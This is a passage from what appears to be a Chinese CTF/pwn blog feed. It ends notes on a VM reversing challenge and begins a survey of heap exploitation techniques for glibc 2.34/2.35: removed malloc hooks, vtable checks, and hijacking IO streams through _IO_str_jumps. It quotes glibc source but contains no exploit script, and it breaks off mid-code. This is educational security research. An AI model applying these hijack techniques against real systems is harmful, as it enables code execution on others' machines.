5B，ptr+72存的是指针数组，栈，这里会被释放，地址由ptr+92提供数组下标索引,size用于malloc的操作，			free旧的stack，创建一个新的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14	无操作数							 1B		NOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;初步分析，大概有8个寄存器（ (unsigned __int8)getbyte_value(position + 2) &amp;gt; 7u）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;vm_file 的结构体&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0x0			R0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x8			R1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x10		R2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x18		R3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x20		R4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x28		R5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x30		R6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x38		R7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x40		malloc申请出来的指针 用作rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x48		chunk结束的地方，栈顶的地址		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x50		PC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x58(4B)		malloc后标记为0，stck是否为空，stack的length&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x5c		chunk的实际空间大小,stack的字节大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;stack 是在 pc 之后申请的，通过 jmp 可以将微程序劫持到 vm_stack 上面，一字节的最大跳转时 0xff，pc 为 0x010 大小&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</guid>
            <title>高版本glibc堆的几种利用手法</title>
            <link>http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</link>
            <category>pwn</category>
            <pubDate>Fri, 03 Jun 2022 11:15:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;glibc-高版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glibc-高版本&#34;&gt;#&lt;/a&gt; Glibc 	高版本&lt;/h1&gt;
&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言：&lt;/h2&gt;
&lt;p&gt;​		本文旨在讲述在 glibc 2.34ubuntu 高版本下（2.34-0ubuntu3.2）的一些利用手法是否依旧可以使用。会对某些手法进行概括，并没有对其进行深入透彻的讲述。感兴趣的朋友可以自行学习，最后详细介绍了 house of banana.&lt;/p&gt;
&lt;p&gt;我只是站在了前任师傅的高台上，为大家进行一些总结分析。&lt;/p&gt;
&lt;p&gt;​		前不久打算深入的去了解在 2.34 以及 2.35 这两个较高版本的 glibc 的堆漏洞的利用。&lt;/p&gt;
&lt;h2 id=&#34;234235-如何利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#234235-如何利用&#34;&gt;#&lt;/a&gt; 2.34 (2.35) 如何利用&lt;/h2&gt;
&lt;h3 id=&#34;一些对比&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些对比&#34;&gt;#&lt;/a&gt; 一些对比&lt;/h3&gt;
&lt;p&gt;2.34 与 2.35 其实非常接近，一般情况下，我们利用的手法也都是一致的，除了继承了 2.29 以来 的各种保护机制，2.34 开始最大的特点，就是删除了__free_hook&lt;/p&gt;
&lt;p&gt;__malloc_hook&lt;/p&gt;
&lt;p&gt;__realloc_hook&lt;/p&gt;
&lt;p&gt;__memalign_hook&lt;/p&gt;
&lt;p&gt;__after_morecore_hook&lt;/p&gt;
&lt;p&gt;这几个常用的钩子函数，而我们最常用的 malloc_hook 以及 free_hook 被完全的禁止了（虽然我们依旧可以在程序中找到对应的符号，但是相关的函数不在对其进行调用），我们只能另寻出路。其实在 2.29 以后的版本中，很多手法都已经失效了，我们常用的无外乎就是劫持程序执行流，以及输入输出流。在 2.23 的版本中，我们是可以修改 vtable，但是 2.24 后就禁止修改，以及再到后面的一些版本还会检查我们的 vtable 是否在允许的范围中（所有的 vtable 储存在一个数组中，以__start_libc_IO_vtables 开始，__stop_libc_IO_vtables 结束）。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_vtable_check (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; SHARED&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Honor the compatibility flag.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*flag) (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;) = atomic_load_relaxed (&amp;amp;IO_accept_foreign_vtables);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; PTR_DEMANGLE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  PTR_DEMANGLE (flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (flag == &amp;amp;_IO_vtable_check)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* In case this libc copy is in a non-default namespace, we always&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     need to accept foreign vtables because there is always a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     possibility that FILE * objects are passed across the linking&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     boundary.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Dl_info di;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;l&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!rtld_active ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        || (_dl_addr (_IO_vtable_check, &amp;amp;di, &amp;amp;l, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;amp;&amp;amp; l-&amp;gt;l_ns != LM_ID_BASE))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是，在 2.34 的早期版本又是可以写的（glibc-2.34-0ubuntu1_amd64）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;p1.jpg&#34; alt=&#34;p1&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个时候我们可以尝试攻击 vtable 结构体，达到 getshell 的目的。&lt;/p&gt;
&lt;p&gt;但是在后面的几次更新中，又将修复了这个漏洞，在 (Ubuntu GLIBC 2.34-0ubuntu3.2) 2.34 版本中，就不可以修改（目前已知在 2.340ubuntu3 版本以及之前的版本依旧有可写的权限）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;p2.png&#34; alt=&#34;p2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以找到很多关于如何绕过 vtable check 的办法进行劫持 IO 流，其中最主流的还是利用 _IO_str_jumps  和 _IO_wstr_jumps 两个虚表，&lt;/p&gt;
&lt;p&gt;二者利用几乎一样。我们在源码 /libio/strops.c 可以看到相关的 vatable 的内容，以下我以_IO_str_jumps 作主要说明。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_jump_t&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_str_jumps&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;libio_vtable&lt;/span&gt; =&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT_DUMMY,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(finish, _IO_str_finish),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(overflow, _IO_str_overflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(underflow, _IO_str_underflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(uflow, _IO_default_uflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(pbackfail, _IO_str_pbackfail),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsputn, _IO_default_xsputn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsgetn, _IO_default_xsgetn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekoff, _IO_str_seekoff),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekpos, _IO_default_seekpos),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(setbuf, _IO_default_setbuf),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(sync, _IO_default_sync),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(doallocate, _IO_default_doallocate),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(read, _IO_default_read),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(write, _IO_default_write),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seek, _IO_default_seek),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(close, _IO_default_close),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(stat, _IO_default_stat),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(showmanyc, _IO_default_showmanyc),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(imbue, _IO_default_imbue)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里面有两个很有用的函数&lt;/p&gt;
&lt;p&gt;JUMP_INIT(finish, _IO_str_finish),&lt;br&gt;
JUMP_INIT(overflow, _IO_str_overflow),&lt;/p&gt;
&lt;p&gt;相关源码如下&lt;/p&gt;
&lt;h4 id=&#34;_io_str_finish&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_io_str_finish&#34;&gt;#&lt;/a&gt; _IO_str_finish&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Glibc 2.34&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_str_finish (FILE *fp, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dummy)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_buf_base &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; (fp-&amp;gt;_IO_buf_base);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;_IO_buf_base = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_default_finish (fp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里我们值得注意的是_IO_str_finish，在之前版本中，函数中其实是存在任意函数执行的漏洞的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Glibc 2.31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_str_finish (_IO_FILE *fp, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dummy)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_buf_base &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (((_IO_strfile *) fp)-&amp;gt;_s._free_buffer) (fp-&amp;gt;_IO_buf_base); &lt;span class=&#34;comment&#34;&gt;//我们控制 _free_buffer 为目标函数，就达到了任意执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;_IO_buf_base = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_default_finish (fp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是在新版本的函数中，将这部分删除了，所以我们无法通过这里 getshell.&lt;/p&gt;
&lt;h4 id=&#34;_io_str_overflow&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_io_str_overflow&#34;&gt;#&lt;/a&gt; _IO_str_overflow&lt;/h4&gt;
&lt;p&gt;2.34 对比之前的版本，这里并没有太大的变化，但是因为没有了 free_hook 事情变得不容乐观&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span 